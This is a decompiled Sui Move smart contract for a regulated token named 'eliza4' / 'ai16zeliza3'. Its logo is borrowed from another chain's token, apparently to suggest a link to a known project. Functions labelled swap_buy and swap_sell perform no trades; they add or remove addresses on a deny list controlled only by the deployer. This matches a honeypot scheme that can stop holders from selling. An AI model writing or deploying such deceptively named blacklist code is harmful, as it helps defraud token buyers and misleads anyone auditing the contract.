module 0xc34e95043aa0c8603d265cecd462359c230c3fded88b47e44e85e4875b3947c2::eliza {
    struct ELIZA has drop {
        dummy_field: bool,
    }

    fun init(arg0: ELIZA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<ELIZA>(arg0, 9, b"eliza4", b"ai4-token", b"ai16zeliza3", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://dd.dexscreener.com/ds-data/tokens/solana/wUtwjNmjCP9TTTtoc5Xn5h5sZ2cYJm5w2w44b79yr2o.png?size=lg"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<ELIZA>(&mut v3, 1100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<ELIZA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<ELIZA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<ELIZA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ELIZA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<ELIZA>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ELIZA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<ELIZA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

